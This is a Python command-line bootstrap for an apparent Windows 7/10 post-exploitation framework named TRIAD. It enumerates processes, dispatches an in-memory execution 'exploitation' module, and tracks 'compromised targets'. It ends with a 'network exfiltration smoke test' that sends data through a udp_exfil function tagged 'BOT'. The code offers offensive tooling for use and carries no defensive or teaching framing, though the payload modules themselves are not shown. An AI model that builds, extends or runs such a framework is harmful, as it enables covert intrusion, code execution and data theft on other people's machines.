import asyncio
import sys
from core.orchestrator import TriadOrchestrator
from engines.factory import EngineFactory
from modules.recon.proc_list import ProcessDiscovery
from modules.exploitation.memory_exec import MemoryExecutionModule


async def minimal_bootstrap():
    """
    Minimal bootstrap without external dependencies.
    Validates pure async Windows kernel integration.
    """
    orchestrator = TriadOrchestrator()
    engine = EngineFactory.get_engine("Windows")

    print("=" * 60)
    print("TRIAD | Core Nexus v0.1.0")
    print("Windows 7/10 Post-Exploitation Framework")
    print("=" * 60)

    try:
        orchestrator_task = asyncio.create_task(orchestrator.run_forever())

        await orchestrator.logger.info(
            "test_cli",
            "Framework initialized",
            {"engine": "Windows", "version": "0.1.0"},
        )

        print("\n[*] Discovering processes...")
        proc_module = ProcessDiscovery(engine)
        await orchestrator.dispatch(proc_module, "process_discovery")

        await asyncio.sleep(0.5)

        processes = await engine.enumerate_processes()
        print(f"[+] Enumerated {len(processes)} processes")

        await orchestrator.bridge.register_target(
            "local_system",
            {"process_count": len(processes), "engine": "Windows", "status": "active"},
        )

        print("[*] Initializing exploitation engine...")
        mem_exec_module = MemoryExecutionModule(engine, orchestrator.bridge)
        await orchestrator.dispatch(mem_exec_module, "memory_exec")

        print("[+] Reconnaissance module dispatched")
        print("[+] Exploitation engine ready\n")

        print("=" * 60)
        print("Orchestration Status")
        print("=" * 60)
        status = orchestrator.get_status()
        print(f"Running: {'Yes' if status['is_running'] else 'No'}")
        print(f"Active Modules: {status['active_modules']}")
        print(f"Registered Targets: {status['bridge_metrics']['total_targets']}")
        print(f"System Events: {status['bridge_metrics']['total_events']}")

        await asyncio.sleep(1.0)

        logs = orchestrator.logger.get_logs(limit=10)
        if logs:
            print("\n" + "=" * 60)
            print("Recent Log Entries")
            print("=" * 60)
            for log in logs:
                print(f"[{log['level']}] {log['module']} - {log['message']}")
            print()

        metrics = orchestrator.bridge.get_metrics()
        print("=" * 60)
        print("Bridge Metrics")
        print("=" * 60)
        print(f"Targets discovered: {metrics['total_targets']}")
        print(f"Compromised targets: {metrics['compromised_targets']}")
        print(f"Events published: {metrics['total_events']}\n")

        await asyncio.sleep(1.0)

        orchestrator.shutdown()
        orchestrator_task.cancel()

        try:
            await orchestrator_task
        except asyncio.CancelledError:
            pass

        print("[*] Framework shutdown complete")

        # --- network exfiltration smoke test ---
        try:
            from core.network.receiver import start_receiver, sessions
            from core.network.outbound import udp_exfil
            import time
            print("[*] starting receiver for smoke test")
            start_receiver()
            time.sleep(0.5)
            udp_exfil('224.0.0.251', b'test', 'BOT','TST')
            time.sleep(0.5)
            print("[+] smoke sessions:", sessions)
        except Exception as e:
            print(f"[!] network smoke test failed: {e}")

    except Exception as e:
        print(f"[ERROR] {e}")
        await orchestrator.logger.critical(
            "test_cli", "Unhandled exception", {"error": str(e)}
        )
        raise


if __name__ == "__main__":
    try:
        asyncio.run(minimal_bootstrap())
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
        sys.exit(0)
